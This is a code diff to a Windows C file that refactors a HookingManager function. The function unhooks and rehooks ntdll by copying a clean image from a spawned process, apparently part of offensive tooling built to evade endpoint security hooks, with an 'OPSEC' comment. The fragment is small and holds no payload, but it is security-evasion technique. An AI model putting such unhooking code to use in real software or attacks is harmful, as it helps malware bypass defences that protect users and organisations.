@@ -580,23 +580,11 @@ LEAVE:
 }
 
 // True if Unhooking, False if Rehooking
-VOID HookingManager(BOOL UnHook){
+VOID HookingManager(BOOL UnHook, LPVOID pCache, HMODULE p_ntdll, SIZE_T ntdll_size){
 // TODO IMPLEMENT GHOSTFART INSTEAD OF PERUN'S FART & MORE OPSEC HERE
 
 #if CONFIG_UNHOOK == TRUE
 
-#if defined(CONFIG_ARCH) && (CONFIG_ARCH == 64)
-    PVOID p_ntdll = get_ntdll_64();
-#else
-    PVOID p_ntdll = get_ntdll_32();
-#endif //CONFIG_ARCH
-    IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) p_ntdll;
-    IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (p_ntdll + pDosHdr->e_lfanew);
-    IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
-
-    SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
-    // allocate local buffer to hold temporary copy of ntdll from remote process
-    LPVOID pCache = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
     SIZE_T bytesRead = 0;
 
     if(UnHook){
@@ -618,7 +606,6 @@ VOID HookingManager(BOOL UnHook){
         TerminateProcess(pi.hProcess, 0);
 
     }else{
-        mem_cpy(pCache, p_ntdll, ntdll_size);
         ReHookNtdll(p_ntdll, pCache);
     }
 
